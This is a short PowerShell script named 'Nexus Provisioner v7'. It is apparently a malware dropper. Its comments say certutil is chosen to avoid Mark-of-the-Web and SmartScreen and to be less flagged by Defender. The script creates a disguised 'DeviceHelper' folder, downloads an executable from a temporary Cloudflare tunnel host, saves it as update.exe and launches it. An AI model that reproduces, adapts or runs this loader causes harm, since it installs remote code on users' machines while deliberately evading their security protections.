# Nexus Provisioner v7
# certutil download = NO Zone.Identifier/MOTW, no SmartScreen block
# powershell -ep bypass -f = no iex/irm pattern, less flagged by Defender

$d = "$env:LOCALAPPDATA\Programs\DeviceHelper"
if (-not (Test-Path $d)) { New-Item -ItemType Directory -Path $d -Force | Out-Null }

$exe = "$d\update.exe"
certutil -urlcache -split -f "https://possess-scheduling-putting-istanbul.trycloudflare.com/Setup.exe" $exe

Start-Sleep 2
if (Test-Path $exe) { Start-Process $exe }
